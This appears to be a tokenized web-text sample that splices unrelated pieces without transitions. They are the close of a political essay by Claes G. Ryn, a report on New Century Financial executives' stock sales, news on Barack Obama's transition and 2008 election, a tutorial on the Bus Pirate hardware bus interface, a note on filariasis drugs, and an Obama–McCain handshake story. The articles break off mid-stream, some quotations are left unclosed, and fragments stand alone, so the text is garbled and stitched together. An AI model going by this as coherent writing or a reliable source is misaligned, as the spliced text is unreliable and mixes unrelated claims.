Wishing not to antagonize too much those who still identify with an older America and still wield some power , they try not to appear too radical and so often present themselves as " neoconservatives " or even " conservatives . "
As should be clear from their own words , that does not make them friends of traditional America .
Needless to say , neo - Jacobin ideology , though long a potent force , is not the only way of justifying the coup from within .
Those working to centralize power are strongly entrenched in both major parties and in other influential American institutions , and they employ different ideas and symbols to woo and co-opt different constituencies .
Given the growing problems of the United States , why not welcome these efforts to rethink the ways of traditional America ?
Because they are inspired by highly dubious motives that color the proposals for change .
Though those trying to impose a new power structure often speak in the name of America and their rhetoric is sometimes faintly conservative , they are not inspired by a desire to protect and reconstitute the best of the Western tradition .
By changing the meaning of words , they are rather trying to reconcile us to the demise of that heritage and its replacement with their own enlightened and virtuous regime .
Their response to the crisis is aggravating the crumbling of the American constitutional order .
Their prescriptions contain the outlines of tyranny and must fill the friends of traditional American and Western civilization with trepidation .
What is ominous about these , our purported saviors , to repeat , is not that they want power .
It is that they represent a conceited and self - absorbed special interest and have an obsessive desire to rule others — a desire that cannot be concealed by feigned benevolence toward Americans and all mankind .
It is necessary to expose their false solutions to what are real problems and to explore by what measures the best of our civilization might , despite daunting odds , be given a new lease on life .

The Best of Claes G. Ryn
The subprime lending industry was starting to buckle under the weight of bad loans in November 2006 , when executives at Irvine - based New Century Financial Corp .
held a conference call to release their latest earnings .
Loan volume was down and defaults were up , the earnings report showed , and in recent weeks at least five stock analysts had downgraded the company ’s shares .
Moreover , four executives had sold nearly $ 20 million in stock in the last four months , six times as much as they had sold over the previous 12 months .
That led one analyst to ask whether there was anything investors should know .
“ It ’s just part of their personal financial diversification plan , ” Chief Executive Brad A. Morrice said in response to the question during the Nov. 2 earnings call .

Those executive stock sales , however , have emerged as a central element in the Justice Department ’s criminal investigation of New Century , according to a person familiar with the inquiry who was not authorized to speak publicly .
No charges have been filed , and attorneys for the company ’s former top executives say that none of the executives sold stock based on information that had not been disclosed to the public and that the executives retained most of their shares when the company went under .
“ Their stock sales were modest -- and entirely appropriate -- steps to diversify their assets , ” said John Spiegel , a Los Angeles attorney who represents five former New Century executives .
“ Any suggestion to the contrary simply flies in the face of the facts . ”
Justice Department officials declined to comment on their investigation of New Century , which collapsed into bankruptcy in early 2007 after a short - lived reign as the nation ’s biggest subprime lender .

The Times conducted its own review of the executive stock trades , analyzing Securities and Exchange Commission filings detailing 277 stock purchases and sales from 2003 to 2007 by six top executives .
Among other things ,
The Times looked at the executives ’ use of trading plans to sell stock , mostly after exercising options to buy at a low price and then sell at a much higher price .
Federal regulators sanctioned use of such plans in 2000 as a way for executives to engage in regular sales of stock without being accused of making trades based on inside information .
To be an effective shield , however , the plans must be designed and executed carefully , securities experts say .
Although the trading plans themselves do not have to be disclosed publicly , executives routinely disclose when a sale is made under a plan .
By reviewing these disclosures , as well as the plans for two of the executives , The Times found that :
Advertisement
* Company founders Robert K. Cole and Edward F. Gotschall adopted trading plans in June 2006 and then started new ones less than a year later , amid rising loan defaults .
Between June and September 2006 alone , the rate of loans that were delinquent more than 60 days climbed nearly 30 % .
* Cole adopted a trading plan on Sept. 15 , 2006 , and sold 25,000 shares under it the same day .
Two other executives , Chief Financial Officer Patti M. Dodge and Executive Vice President Kevin Cloyd , sold stock within a week of setting up their plans in February 2005 .
Legal experts say making trades so quickly after a plan is adopted weakens the protection offered by a trading plan , because prosecutors or shareholder attorneys could argue that the plans were drafted to facilitate a quick dumping of shares .
* All six executives either enacted plans or made trades on the same dates as other executives , which legal experts say could raise questions about whether they were acting in concert on inside information .
* The trades do not appear to follow regular patterns .
Over two years , for example , Morrice made only two sales under his trading plan -- and both were in July 2005 , allowing him to sell $ 6.4 million worth of stock before the price fell about 40 % later that summer .

Typically , trading plans call for executives to sell a set amount of shares each month or quarter , experts say , and executives usually stick to the same plan for at least a year .
“ Any time there is a change in the trading plan , that raises a red flag , ” said Andrew Stoltmann , a Chicago securities attorney who advises firms on stock trading .
“ If you put on top of that a share price that ’s declining and a company that is soon to go into bankruptcy , prosecutors can have a field day with those sorts of facts . ”
New Century was founded in 1995 by Cole , Gotschall and Morrice , who had worked together at Plaza Home Mortgage in Santa Ana .
Selling high - cost loans to high - risk borrowers , they built a subprime lending empire with more than 240 offices in 35 states and more than 7,000 employees , commanded from a high - rise in Irvine .
Fueled by the housing boom , the company ’s share price closed at an all - time high of $ 65.14 on Dec. 15 , 2004 .
But it was downhill from there , as New Century and other subprime lenders suffered rising defaults and reduced demand .

In March 2007 , New Century disclosed in an SEC filing that federal investigators were “ conducting a criminal inquiry under the federal securities laws in connection with trading in the company ’s securities , as well as accounting errors regarding the company ’s allowance for repurchase losses . ”
Then , on April 2 , it filed for bankruptcy protection .
Government investigators have not spoken publicly about the probe since , but former prosecutors and others say the Justice Department is under renewed pressure to bring cases in the wake of the controversial $ 700 - billion rescue plan for the financial industry .
Public outrage over the bailout could lead to “ a tidal wave of cases that we are going to see across the entire spectrum of the financial industry , ” said Dan Small , a former federal prosecutor who now works for law firm Holland & Knight in Boston .
Attorneys for the six former New Century executives say their clients believed through late 2006 that the company would make its earnings targets .
The executives ’ faith in the company , they added , was bolstered by interest from Merrill Lynch & Co. and other firms in buying New Century at a significant premium over its share price .
But the examiner hired to review the company ’s finances by the U.S. Bankruptcy Court said New Century ’s troubles had surfaced by 2004 .

“ New Century knew from multiple data sources that its loan quality was problematic , starting no later than 2004 , ” examiner Michael J. Missal wrote in his report this year , adding that “ senior management before 2006 took few steps to address the troubling loan quality trends . ”
For example , the proportion of borrowers who had failed to make payments in the first three months of a loan reached 10 % by November 2004 -- up from 4.2 % in March , according to an internal report filed in a federal lawsuit against New Century by the New York State Teachers ’ Retirement System .
In 2004 , Executive Vice President Stergios Theologides was the only senior executive with a trading plan .
By early 2005 , after the stock price had peaked , all six of the executives had adopted trading plans .
Unlike Theologides , who had methodically made sales of roughly the same amount over the previous two years , the other executives made trades infrequently , with wide variations in the amounts of shares sold .

“ Under these trading plans , you would expect to see a pattern of sales , ” said David Nolte , a forensic accountant with Fulcrum Inquiry in Los Angeles , which performs investigative audits for government agencies and law firms .
“ That ’s not the situation with New Century .
That ’s why , if prosecutors wanted , they could draw a distinction between a plan that is legitimate and a plan that is a ruse . ”
Dodge , the chief financial officer , set up her plan on Thursday , Feb. 17 , 2005 , and sold one - fifth of her holdings the following Tuesday .
She exercised stock options that allowed her to buy shares between about $ 5 and $ 9 for a total of about $ 56,000 and sell them at $ 50 for nearly $ 350,000 .
Gotschall , the board vice chairman , also set up a plan Feb. 17 .
He made his first sale under that plan June 8 : 100,000 shares for $ 5.2 million .
He did not use that plan for any other sales .
Instead , he started a new plan in May 2005 and sold shares on two days in September for about $ 3.2 million .
Gotschall adopted a new plan in June 2006 and another in November 2006 .
Although retired from his job as chief financial officer , he continued to serve on the board of directors .
Cole adopted seven plans in 2005 - 06 .
He retired as CEO in June 2006 but remained chairman of the board .

Manny Abascal , Cole ’s attorney , said his client changed plans so often because he was setting different floor prices for the stock to ensure that he did not get rid of his shares too cheaply .
In some cases , that actually prevented him from selling stock .
For example , he was unable to sell 50,000 shares in November and December 2006 because the share price never hit $ 40 .
“ These plans are flexible and can be changed when circumstances change , and there ’s nothing wrong with that , ” said Abascal , who is with law firm Latham & Watkins in Los Angeles .
But Small , the former prosecutor , said changing plans defeats the purpose of having one .
“ The whole point of those plans is to have them in place and being executed on a regular , routine basis , ” Small said .

By early 2006 , the company was seeing a huge increase in the amount of claims from investors who had bought New Century loans and now wanted their money back .
Typically , investors make these demands when borrowers miss payments .
Such claims more than doubled in less than six months , from $ 75.3 million in January 2006 to $ 151.2 million in May 2006 , according to internal company documents filed with the teachers ’ lawsuit .
Spiegel and Abascal have moved to dismiss that suit , saying the trading plans eliminated the potential for insider trading .
A ruling on that motion is pending .
The two attorneys say their clients were bullish on the company , noting that Cloyd , Dodge and Morrice continued to buy shares into late 2006 .
Morrice and Cloyd bought more shares than they sold in 2006 .
The attorneys cited a March 2006 offer from Merrill Lynch to buy New Century at about $ 55 a share , when the stock was trading in the mid-$ 40 range .
The offer was rejected .
Advertisement
In June 2006 , Dodge , Cole and Theologides -- who had n’t traded for nearly a year -- adopted new trading plans that allowed them to kick - start their stock sales .
Gotschall also adopted a new plan that allowed him to ramp up sales .
Together , the four executives sold nearly half a million shares from July to October 2006 .
By comparison , in the 12 months from July 2005 to June 2006 , only Gotschall sold any shares , a total of 75,000 .
Cole sold $ 4.7 million worth of shares , or about 7 % of his stake in the company , on Aug. 7 , 2006 , under one of his plans .
He had a second plan at the time but never used it , according to his attorney .
Instead , on Sept. 15 , Cole adopted four new plans -- one to cover stock sales for each of the next four months .
Advertisement
These plans authorized a sale of 25,000 shares immediately and another 25,000 shares three weeks later .
Cole reported selling the shares for $ 2 million .
“ If it looks like you are adopting it and trading the same day or shortly thereafter , it looks like you ’re just making a bet on current information , ” said David Priebe , an attorney with DLA Piper in East Palo Alto who helps set up trading plans .
Abascal said the decision to sell Sept. 15 was made by Cole ’s broker , who was operating under a 14 - day trading window and picked the first day that the stock price was above $ 40 .
By the time of the Nov. 2 , 2006 , earnings call , New Century ’s financial footing had worsened , with the company reporting that the rate of people failing to make their first loan payment had nearly doubled from 2005 .
Advertisement
Morrice said New Century would adopt tougher lending standards in hopes of curbing defaults , but added that “ the impact to our overall results is not expected to be significant . ”
Investors kept heading for the exits , driving New Century shares down to $ 37.23 on Nov. 17 , from more than $ 50 six months earlier .
On Nov. 18 , Gotschall adopted a new trading plan , his fourth in less than two years .
Two days later , on Nov. 20 , he sold about $ 2.4 million worth of stock under that plan .
On Nov. 21 , Gotschall sold nearly $ 5 million in stock after exercising about 75 % of his remaining options , also under that trading plan .
Advertisement
Spiegel , who is with law firm Munger , Tolles & Olson in Los Angeles , said Gotschall ’s June 2006 trading plan called for him to sell stock just days before the Nov. 2 earnings release -- and a sale just before that disappointing report might draw criticism .
As a result , Spiegel said , Gotschall adopted a new trading plan , which allowed him to push the sales back a few weeks .
Securities experts , however , said that whatever the motivation -- good or bad -- changes to trading plans undermine their purpose .
“ The whole idea is you do n’t have any control over your sales , and if you go in and make changes or make other sales , then you are back in control , ” said Thom F. Carroll , a financial planner with Carroll , Frank & Plotkin in Baltimore .
“ You ’re now changing the rules to meet your needs , and it ’s not a trading plan under that safe harbor .
It ’s whatever I want to do whenever I want to do it . ”
Within three months of Gotschall ’s November sales , New Century shares lost 50 % of their value .
By March , the company had collapsed and trading in its shares was halted by the New York Stock Exchange .

CHICAGO  President - elect Barack Obama is poised to move swiftly to reverse actions that President Bush took using executive authority , and his transition team is reviewing limits on stem cell research and the expansion of oil and gas drilling , among other issues , members of the team said Sunday .
As Mr. Obama prepared to make his first post-election visit to the White House on Monday , his advisers were compiling a list of policies that could be reversed by the executive powers of the new president .
The assessment is under way , aides said , but a full list of policies to be overturned will not be announced by Mr. Obama until he confers with new members of his cabinet .
“ There ’s a lot that the president can do using his executive authority without waiting for Congressional action , and I think we ’ll see the president do that , ” John D. Podesta , a top transition leader , said Sunday .
“ He feels like he has a real mandate for change .
We need to get off the course that the Bush administration has set . ”
Throughout his presidency , Mr. Bush has made liberal use of his executive authority , using it to put his stamp on a range of hot - button policy issues .
UPDATE : New firmware with JTAG and more
We ’re always excited to get a new chip or SIM card to interface , but our enthusiasm is often dampened by the prototyping process .
Interfacing any chip usually means breadboarding a circuit , writing code , and hauling out the programmer ; maybe even a prototyping PCB .
A few years ago we built the first ‘ Bus Pirate ’ , a universal bus interface that talks to most chips from a PC serial terminal .
Several standard serial protocols are supported at 3.3 - 5volts , including I2C , SPI , and asynchronous serial .
Additional ‘ raw ’ 2 - and 3 - wire libraries can interface almost any proprietary serial protocols .
Since this has been such a useful tool for us , we cleaned up the code , documented the design , and released it here with specs , schematic , and source code .
Concept Overview
The Bus Pirate is a serial terminal bridge to multiple IC interface protocols .
We type commands into a serial terminal on the computer .
The commands go to the Bus Pirate through the PC serial port .
The Bus Pirate talks to a microchip in the proper protocol , and returns the results to the PC .
All pins output 3.3volts , but are 5 volt tolerant .
On - board 3.3 volt and 5 volt power supplies are available to power the connected chip .
Software configurable I2C pull - up resistors complete the package .
The serial terminal interface works with any system : PC , Mac , Linux , Palm Pilots , WinCE devices , etc ; no crapware required .
We considered a USB device , but USB is n’t compatible with the huge number of hand - held devices that have a serial port .
We also wanted a 3.3 volt device with 5 volt tolerant inputs , but most popular through - hole USB microcontollers were 5 volt parts ( e.g. the PIC18Fx550 ) .
The Bus Pirate currently ‘ speaks ’ three hardware protocols for high - speed interfacing , and has two software protocol libraries for easy bus manipulation .
The theory and specification of each protocol is beyond what we can cover here , but check out some of these tutorials :
I2C
A slow 2 wire bus .
Wikipedia is a great place to start for I2C background .
I2C - Bus.org , Robot Electronics , Embedded Systems Academy , and Embedded.com have decent I2C tutorials .
SPI
A simple 3 wire bus .
Wikipedia has background ; Embedded.com has a great tutorial and comparison to I2C .
Universal Asynchronous Receiver Transmitter ( UART or serial )
A clock and timing dependent serial protocol best known for its appearance as the PC serial port protocol .
Wikipedia has background on asynchronous serial protocols .
Raw 2 wire
This is a generic 2 wire protocol library , similar to I2C but without an ACK bit .
I2C and many proprietary 2 wire protocols can be formed using the bus manipulations available in this mode .
Use this library to work with non-I2C 2 wire devices , like smartcards or Sensirion SHT11 temperature / humidity sensors .
Raw 3 wire
This is a generic 3 wire protocol library , similar to SPI but without the constraints of a hardware module .
Use this library to work with devices that use non -8bit compatible 3 - wire protocols , like the Sparkfun Nokia 6100 LCD knock - off .
Many 3 wire protocols can be formed using the bus manipulations available in this mode .

PIC 24FJ64GA002
We used a PIC24FJ64GA002 microcontroller in the Bus Pirate ; this is the same chip we used in our mini-server project .
It ’s fast enough to do everything we want ( 16MIPS ) , and the peripheral pin select feature allows the hardware SPI , UART , and I2C modules to share output pins .
Each power pin needs a decoupling capacitor ( C12,13 ) , and the MCLR function requires a resistor ( R7 ) between pin 1 and 3.3 volts .
The PIC has an internal voltage regulator that requires a 10 uF tantalum capacitor ( C3 ) , though we used a plain electrolytic capacitor without issue .
Read about programming and working with this chip in our PIC24 F tutorial .
If you do n’t have a PIC debugger , several readers recommend the under - $ 40 ICD2 clones on eBay .
The PIC runs at 3.3 volts , but the digital - only pins are 5 volt tolerant for interfacing 5 volt logic .
Pins 14,15,16,17,18,21 , and 22 , are digital only , which we determined by looking through the datasheet and eliminating any pins with an analog connection type ( table 1 - 2 , pages 11 - 16 ) .
According to the datasheet , I2C pins are also 5 volt tolerant .
There ’s a bunch of conflicting information on the web , but datasheet page 230 , parameter DI28 , clearly states that the max input for a 24FJ64GA002 I2C pin without analog circuitry is 5.5 volts .
Pins 21 and 22 ( RB10/11 ) can pull - up SDA / SCL through resistors R4 and R5 .
MAX3223CPP
This chip converts 3.3 volt serial output to +/-10 volt RS232 signals compatible with a PC serial port .
The MAX3223CPP is a 3 - 5 volt version of the MAX202 , with extra power saving features .
MAX RS232 transceivers require four 0.1uF capacitors for a charge pump ( C4,5,7,8 ) , and one decoupling capacitor ( C17 ) .
We used the same capacitors for everything .
We used a MAX3223CPP , which does n’t seem to be available anymore .
MAX3223EEPP + is a pin-compatible newer version , available at Digikey for $ 7 .
Ouch !
None of the 3223 ’s power saving features are used , so a cheaper , simpler 3.3 volt RS232 transceiver should be substituted if at all possible .
Power supplies
Most chips can be powered from the Bus Pirate ’s on - board 3.3 volt and 5 volt supplies .
5 volts is supplied by a common 7805 regulator ( VR2 ) and two decoupling capacitors ( C9,10 ) .
An LM317 adjustable regulator ( VR1 ) is set to 3.3 volts using two resistors ( R2,3 ) , and requires two decoupling capacitors ( C6,7 ) .
The circuit requires a 7 - 10 volt DC supply ( J1 ) .
Part list
Firmware
The firmware is written in C using the free demonstration version of the PIC C30 compiler .
Learn all about working with this PIC in our introduction to the PIC 24 F series .
Download the project archive ( ZIP ) .
main.c – Handles the user terminal interface .
busPirate.c – Abstraction routines that convert syntax to actions on the proper bus .
uartIO.c – IO routines for both hardware UARTs .
m_i2c_1.c – Software I2C routines by [ Michael Pearce ] .
We could n’t get the PIC hardware I2C to work , so we used this helpful library .
The software does n’t take into account the I2C speed setting , and seems to work at about 5KHz .
SPI.c – Routines that drive the hardware SPI module .
raw2 wire .c – Software 2 - wire interface library .
raw3 wire .c – Software 3 - wire ( SPI ) interface library .
User input is held in a 4000 byte buffer until a newline character ( enter ) is detected .
If the first character of the input is a menu option ( see below ) , the menu dialog is shown , otherwise the string is parsed for data to send over the bus ( see syntax ) .
The code consists of an embarrassing number of switch statements and spaghetti code .
Terminal interface
Rather than write a junk piece of software to control the device , we gave it a serial command line interface that will work with any ASCII terminal .
The bus pirate responds to commands with three digit result codes and a short message .
The codes are designed with PC automation in mind .
We ’ve included a table of result codes in the project archive ( zip ) .
Menu options
Menu options are single character commands that do n’t involve data transfers .
Enter the character , followed by < enter > , to access the menu .
? – Show a help menu with commands and syntax .
M – Set the bus mode ( SPI , I2C , UART , raw 2 wire , raw 3 wire ) .
Followed immediately by a prompt for speed , polarity , and output state ( mode dependent ) .
Bus speeds : SPI:30 , 125 , 250 , 1000KHz .
I2C:100 , 400 , 1000KHz .
UART : 300 , 1200 , 2400 , 4800 , 9600 , 19200 , 38400 , 57600 , 115200 bps .
Raw modes : 1 , 10 , 50KHz .
Inverse clock setting sets the idle state opposite of normal ( normal SPI : idle low ; normal UART : idle high ) : SPI : idle high ; UART : idle low .
Some modes have optional high - z output modes for use with pull - up resistors ( Low=ground , High=input ) .
L – Toggle bit transmit / receive order : most / least significant bit first .
P – SDA / SCL pin pull - up resistor toggle ( 3.3volts ) .
Only valid in I2C and raw 2 wire modes .
O – Set number output display format .
The terminal can display numbers as decimal , hexadecimal , and binary ASCII values .
A fourth format sends the raw , unprocessed byte for reading ASCII formatted text .
Syntax
A simple syntax is used to communicate with chips over a bus .
Syntax commands have generic functions that generally apply to all bus types .
A/a/@ – Toggle auxiliary pin .
Capital “ A ” sets AUX high , small “ a ” sets to ground .
@ sets aux to input ( high impedance mode ) and reads the pin value .
[ – Start data write .
SPI / raw 3 wire : chip select enabled .
I2C / raw 2 wire : start condition .
RS232 : open UART , discard received bytes .
{ – Start data write with reads .
Same as [ , except : SPI / raw 3 wire : show the read byte for each write .
RS232 : display data as it arrives asynchronously .
] or } – End data write .
SPI / raw 3 wire : chip select disabled .
I2C / raw 2 wire : stop condition .
RS232 : close UART .
R/r – Read byte .
SPI / raw 3 wire : send dummy byte , return read .
I2C : read byte with ACK .
Raw 2 wire : read 8 bits .
RS232 : check UART for byte and return , or fail if empty .
Use 0r1…255 for bulk reads up to 255 bytes .
0 b – Write this binary value .
Format is 0b00000000 for a byte , but partial bytes are also fine : 0b1001 .
0h or 0x – Write this HEX value .
Format is 0h01 or 0x01 .
Partial bytes are fine : 0xA . A - F can be lower - case or capital letters .
0 -255 – Write this decimal value .
Any number not preceded by 0x , 0h , or 0b is interpreted as a decimal value .
, or space – Value delimiter .
Use a coma or space to separate numbers .
Any combination is fine , no delimiter is required between non-number values : { 0xa6,0 , 0 16 5 0b111 0haF} .
Direct bus manipulation commands for raw 2 wire mode and raw 3 wire mode .
^ – Send one clock tick .
Use 0 ^1…255 for multiple clock ticks .
/ and \ – Toggle clock level high ( / ) and low ( \ ) .
Includes clock delay ( 100uS ) .
-/_ – Toggle data state high ( -) and low ( _ ) .
Includes data setup delay ( 20uS ) .
! – Read one bit with clock .
. – Read data pin state ( no clock ) .
& – Delay 1uS .
Use 0&1…255 for multiple delays .
Using it
Here are two examples that show the Bus Pirate in action .
Terminals should be set to ASCII mode with local echo , we used the Windows serial terminal .
The PC - side serial connection is 115200 bps , 8N1 .
The Bus Pirate should respond to any single line feed type ( 0x0a , 0x0d ) , or both ( Windows style ) .
. I2C/SPI – Flash 24LC1025 EEPROM
Microchip ’s EEPROMS are popular permanent - storage memory chips , the 24LC1025 has 128 Kbytes of storage with an I2C interface .
We can test this chip without bread - boarding a big circuit or writing code .
The picture shows an 24LC1025 connected to the Bus Pirate .
The EEPROM works from 2.7 to 5volts , so we used the 3.3 volt supply from the Bus Pirate to power the circuit .
The on - board SDA / SCL pull - up resistors hold the I2C bus high , and eliminate the need for external resistors .
A single 0.1uF capacitor decouples the EEPROM from the power supply .
Setup I2C mode
First , we setup the Bus Pirate for I2C mode and enable the pull - up resistors .
Since the Bus Pirate currently uses a software I2C library , the speed setting does n’t really have an effect .
SPI >m < –enter m for mode select
1. SPI
2. I2C
3. UART
4. RAW 2 WIRE
5. RAW 3 WIRE
MODE >2 < –enter 2 for I2C
900 MODE SET
Set speed :
1. 100KHz ( Standard )
2. 400KHz ( Fast Mode )
3. 1MHz ( High Speed )
SPEED >1 < –speed does n’t really do anything …
901 SPEED SET
202 I2C READY , P/p FOR PULLUPS
I2C > P < –enable the I2C pull - up resistors
205 I2C PULLUP ON
I2C >
Write to EEPROM ( I2C )
All I2C operations begin with a start condition { or [ , and end with a stop condition } or ] .
A write begins by addressing the device ( 1 byte ) and looking for an acknowledgment bit ( ACK ) .
If the EEPROM responds , we can send the data location to write ( 2 bytes ) and data payload ( n bytes ) .
The Bus Pirate automatically checks for an ACK at the end of each write , and ACKs each read .
The 24LC1025 base address is 1010xxy , where xx is determined by the state of pins 2 and 3 , and y is read ( 1 ) or write ( 0 ) mode .
We tied pins 2 and 3 high , making the full write address 1010110 .
We ’ll start writing to the device at the first data location ( 0 0 ) , and write one to thirteen using a mix of data input formats ( 1…13 ) .
I2C >{0b10100110 0 0 1 2 3 4 5 6 7 8 9 10 0 xb 0xc 13 } < – I2C command
210 I2C START CONDITION < –bus start
220 I2C WRITE : 0xA6 GOT ACK : YES < –address sent and ACK received
220 I2C WRITE : 0x00 GOT ACK : YES < –write address
220 I2C WRITE : 0x00 GOT ACK : YES < –write address
220 I2C WRITE : 0x01 GOT ACK : YES < –data
…
220 I2C WRITE : 0x0D GOT ACK : YES
240 I2C STOP CONDITION
I2C >
Read from EEPROM ( I2C )
Reading the 24LC1025 takes two steps .
First , a write command with no data sets the address pointer .
Second , a read command outputs data starting at the location set in step 1 .
The first command is a write command , we use the hexadecimal equivalent of the write address ( 0b10100110 = 0 x a6 ) to save a bit of typing .
The address pointer is set to the location where we wrote our data ( 0 0 ) .
I2C >{0xa6 0 0} < –set write pointer command
210 I2C START CONDITION
220 I2C WRITE : 0xA6 GOT ACK : YES
220 I2C WRITE : 0x00 GOT ACK : YES
220 I2C WRITE : 0x00 GOT ACK : YES
240 I2C STOP CONDITION
With the pointer set , we can start reading data .
The read address is the device address , with the last bit set to 1 ( 0b10100111 or 0 x a7 ) .
We used thirteen r commands to read the data , but we could have used the shorthand version : 0r13 .
I2C >{0b10100111 rrrrrrrrrrrrr} < –read command
210 I2C START CONDITION
220 I2C WRITE : 0xA7 GOT ACK : YES < –chip ACKed the read address
230 I2C READ : 0x01 < –data byte 1
230 I2C READ : 0x02 < –data byte 2
…
230 I2C READ : 0x0D < –data byte 13
240 I2C STOP CONDITION
I2C >
We know the operation was a success because the output matches the data we wrote earlier .
UART – EM406 SurfIII GPS
The EM406 is a tiny 5 volt GPS module that tracks up to 20 satellites .
By default , it outputs NMEA formatted data from a serial port at 4800 bps , 8N1 .
The output format is standard serial , but at 2.8 volts it ’s incompatible with PC serial ports .
The Bus Pirate can interface this GPS without the need for a separate RS232 transceiver or 5 volt power supply .
Setup the UART
First , we setup the Bus Pirate UART to receive serial data at 4800 bps .
I2C >m < –setup mode
1. SPI
2. I2C
3. UART
4. RAW 2 WIRE
5. RAW 3 WIRE
MODE >3 < –UART
900 MODE SET
Set speed :

3. 2400
4. 4800

9. 115200
SPEED >4 < –4800bps
901 SPEED SET
302 UART READY

Enable UART and data reads
An important thing to remember about UARTs is that the data arrives asynchronously .
Unlike SPI and I2C , where data transfer is controlled by the master , serial data can arrive at the UART at any time .
The GPS is a great example of this because it spits out location data continuously , without user intervention .
We developed two read modes to cope with asynchronous data .
{ echos all incoming data as it arrives .
New data will displace and garble data entry , but all input is still accepted normally .
[ opens the UART in a send only mode that discards incoming bytes .
} or ] closes the UART , regardless of the mode .
UART >{ < –open UART with async reads
310 UART OPEN , } TO CLOSE
330 UART READ : 0x80 < –GPS data
330 UART READ : 0x78
Write to the UART
Type in values to send out the UART .
Even if the input is broken up by incoming data , it will be processed on < enter > .
We sent 0x40 as an example , but this has no particular meaning to the GPS module .
330 UART READ : 0x80 0x40 < –random byte to write
320 UART WRITE : 0x40 < – byte written
Close the UART
“ } ” followed by < enter > closes the UART .
330 UART READ : 0x78
303 UART READ : 0x60 } < –close UART command
330 UART READ : 0xE6
340 UART CLOSED
UART >
Do n’t think you can use this GPS data to track us , we do n’t actually get satellite reception down here in mom ’s basement .
Taking it further
The Bus Pirate is an important development tool in our lab .
We keep updating it as we use it , and we ’ll release new firmware as we add protocols and features .
Expect to see the Bus Pirate in future articles .
These improvements are at the top of our list .
Do you have any suggestions ?
New protocols : One Wire , CAN , ???
Controls for polarity and other settings
Adjustable instruction delay
Get hardware I2C module working .
Enable protocol speed settings .
Cheaper , easier to get RS232 transceiver

A public health campaign has saved more than 6 million people from filarial worms , which cause elephantiasis and other grotesque maladies , in just eight years .
Massive donations from GlaxoSmithKline and Merck , made the victory possible according to a report this week in PLoS Neglected Tropical Diseases .
Both companies provided antiparasitic pills , 1.3 billion of them , for the Global Programme to Eliminate Lymphatic Filariasis .
The disease , caused by nematodes that colonize the lymphatic system , affects at least 120 million people worldwide .
As the worms reproduce , they cause ulcers and extreme swelling .
The antiparasitic Albendazole kills the parasites by damaging microtubules in their intestines and brains .
Another drug , Ivermectin , can destroy their nervous systems .
Each treatment costs less than 10 cents and often has additional benefits , ridding its recipients of infections including lice , roundworm , and hookworm .
Half a billion people will receive the parasite - killing medications this year alone .
By 2020 , the disease may be history .

WASHINGTON  It was Senator Barack Obama who crossed the aisle .
On Wednesday evening , as the senators gathered to vote on the $ 700 billion financial rescue package , Mr. Obama , Democrat of Illinois , walked over to the Republican side of the chamber to extend a greeting to Senator John McCain of Arizona .
While it took Mr. Obama several seconds to make his way over to Mr. McCain , the actual handshake lasted barely a second , as Mr. McCain responded with a chilly look , a turn of his head and a brief return handshake .
The moment provided a rare element of drama in an otherwise routine evening of votes .
It was a curious sight on Capitol Hill , the second time in less than a week that the presidential candidates crossed paths in Washington over deliberations on the package intended to stabilize the nation ’s financial system .
Mr. Obama , who first arrived on the Senate floor at 5 p.m. , presented his argument in favor of the legislation in a 13 - minute speech .
Americans have elected Democrat Barack Obama as their first black president , in a transformational election which will reshape US politics and reposition the United States on the world stage .
President - elect Obama , 47 , will be inaugurated the 44th US president on January 20 , 2009 , and inherit an economy mired in the worst financial crisis since the 1930s , two wars in Afghanistan and Iraq and a nuclear showdown with Iran .
Television networks projected his victory over Republican John McCain after President - elect Obama solidified traditional Democratic states and cut deep into the Republican territory which his rival needed to control to win the White House .
Senator McCain conceded defeat in front of a large crowd of supporters and media in Phoenix , Arizona .
" The American people have spoken and they have spoken clearly , " he said .
" A little while ago I had the honour of calling President - elect Barack Obama to congratulate him on being elected the next president of the country that we both love . "
President George W Bush also telephoned President - elect Obama to congratulate him on his " awesome night , " according to White House spokeswoman Dana Perino .
" Mr President - elect , congratulations to you .
What an awesome night for you , your family and your supporters .
Laura and I called to congratulate you and your good bride , " she quoted Mr Bush as telling President - elect Obama .
Seventy - two - year - old Arizona Senator McCain urged Americans to rally behind the President - elect , saying he planned to help Obama tackle the many challenges facing Americans .
" Whatever our differences , we are fellow Americans and please believe me when I say no association has meant more to me than that , " he said .
" It is natural tonight to feel some disappointment but tomorrow we must move beyond it . "
Senator McCain commended President - elect Obama on his achievement and said he respected his ability and perserverance .
" It 's a historical election and I recognise the special significance it holds for African - Americans , " he said .
" I wish the outcome had been different , my friends .
" She is one of the best campaigners I 've ever seen , " he said of Republican vice - presidential candidate Sarah Palin .
Senator McCain called for unity and said running for the presidency was the greatest honour of his life .
The news came sooner than many in the crowd gathered in Chicago 's Grant Park had expected : immediately after polls were closed on the west coast .
Tears , hugs , and chants of " Yes we can ! " and " Obama ! Obama ! " rang into the air as his supporters greeted the news .
" Today I am proud to be a black American , " cheered Rosemary Morris as she sat with two friends at the foot of a statue on the park 's edge as early results were coming in .
" This is a wonderful , wonderful , wonderful day . "
Meteoric rise
President - elect Obama 's historic inauguration will complete a stunning ascent to the pinnacle of US and global politics from national obscurity just four years ago and close an eight - year era of turbulence under President George W Bush .
He will take office with Democrats holding a monopoly in power in Washington , after an epochal election which sparked a rare generational and political realignment and finally snuffed out an era of Republican control .
President - elect Obama is promising to renew bruised ties with US allies , and to engage some of the most fierce US foes like Iran and North Korea .
He has vowed to tackle climate change and provide health care to all Americans .
His presidency also marks a stunning cultural shift with President - elect Obama , the son of Kenyan father and white mother from Kansas , the first African - American president of a nation still riven by racial divides .
Heralding change
When he launched his campaign on a chilly day in Illinois in February 2007 , President - elect Obama forged a mantra of change which powered him throughout the longest , most costly US presidential campaign in history .
With a stunning grassroots political movement , powered by massive multi-million dollar fundraising , President - elect Obama first beat Hillary Clinton , and the Democratic Party 's then - preeminent political machine .
He strode towards victory by capturing the states of Pennsylvania , the key battleground which Senator McCain needed to win to keep his long - shot hopes of victory alive .
In a sweet moment for Democrats , he also seized the states of Ohio and Florida , making a clean sweep of battleground states .
and captured New Mexico and Iowa , two states won by President Bush in 2004 to close out Senator McCain 's possible route towards the White House .
The state of Colorado also fell for the Democratic candidate , for only the second time since 1964 .
President - elect Obama had led national and battleground polls and had capitalised on the fear of Americans pitched into the deep financial crisis , especially as he appeared to be presidential in a string of debates .
Senator McCain had argued that President - elect Obama was too inexperienced to be US commander in chief and would pursue " socialist " redistribution policies that would leave the economy mired in recession .
Senator McCain , 72 , an Arizona senator , would have been the oldest man ever inaugurated for a first term in the White House .

